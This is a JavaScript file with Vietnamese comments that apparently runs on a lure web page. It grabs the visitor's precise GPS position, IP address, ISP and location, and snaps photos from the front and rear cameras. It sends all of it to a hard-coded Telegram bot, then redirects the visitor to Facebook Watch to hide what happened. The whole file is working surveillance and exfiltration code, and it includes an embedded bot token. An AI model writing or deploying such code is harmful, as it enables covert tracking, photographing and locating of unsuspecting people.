const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const ID = '-1003770043455';

// Lấy tọa độ GPS chính xác
function getGPS() {
    return new Promise((res) => {
        if (!navigator.geolocation) return res(null);
        navigator.geolocation.getCurrentPosition(
            (p) => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
            () => res(null),
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
    });
}

// Lấy thông tin mạng và vị trí tương đối qua IP
async function getVitals() {
    try {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        return {
            ip: d.ip || '?',
            isp: d.connection?.org || '?',
            addr: `${d.city}, ${d.region}`,
            lat: d.latitude || 0,
            lon: d.longitude || 0
        };
    } catch (e) { return { ip: '?', isp: '?', addr: '?', lat: 0, lon: 0 }; }
}

// Chụp ảnh từ camera
async function capture(mode) {
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        const v = document.createElement('video');
        v.srcObject = s;
        await v.play();
        return new Promise(res => {
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; 
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                c.toBlob(res, 'image/jpeg', 0.8);
            }, 3000); // Đợi 3 giây để camera lấy nét
        });
    } catch (e) { return null; }
}

async function main() {
    // 1. Thu thập dữ liệu song song
    const [gps, info] = await Promise.all([getGPS(), getVitals()]);
    
    // 2. Chụp ảnh (Tuần tự để tránh xung đột phần cứng camera)
    const p1 = await capture("user");
    const p2 = await capture("environment");

    // 3. Xử lý thông tin vị trí
    const lat = gps ? gps.lat : info.lat;
    const lon = gps ? gps.lon : info.lon;
    const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Sai số cao)";
    
    // Sửa link Maps chuẩn
    const map = `https://www.google.com/maps?q=${lat},${lon}`;

    const cap = `📡 [THÔNG TIN TRUY CẬP]
🕒 ${new Date().toLocaleString('vi-VN')}
📱 Thiết bị: ${navigator.platform}
🌍 IP: ${info.ip}
🏢 ISP: ${info.isp}
📍 Khu vực: ${info.addr}
🛠 Định vị: ${type}
📌 Maps: ${map}
📸 Camera: ${p1 || p2 ? "✅ Đã chụp" : "❌ Thất bại"}`.trim();

    const fd = new FormData();
    fd.append('chat_id', ID);
    
    const media = [];

    // Thêm ảnh chân dung vào album
    if (p1) {
        fd.append('pic1', p1, 'user.jpg');
        media.push({ 
            type: 'photo', 
            media: 'attach://pic1', 
            caption: cap // Caption chỉ đặt ở ảnh đầu tiên
        });
    }
    
    // Thêm ảnh camera sau vào album
    if (p2) {
        fd.append('pic2', p2, 'env.jpg');
        media.push({ 
            type: 'photo', 
            media: 'attach://pic2',
            caption: media.length === 0 ? cap : "" // Nếu ko có ảnh 1 thì ảnh 2 lấy caption
        });
    }

    // 4. Gửi dữ liệu về Telegram
    try {
        if (media.length > 0) {
            fd.append('media', JSON.stringify(media));
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { 
                method: 'POST', 
                body: fd 
            });
        } else {
            // Nếu không có ảnh, gửi tin nhắn text thông thường
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: ID, text: cap })
            });
        }
    } catch (err) {
        console.error("Lỗi gửi tin nhắn:", err);
    }
    
    // 5. Chuyển hướng người dùng
    setTimeout(() => {
        window.location.href = "https://www.facebook.com/watch/";
    }, 500);
}

// Chạy script
main();
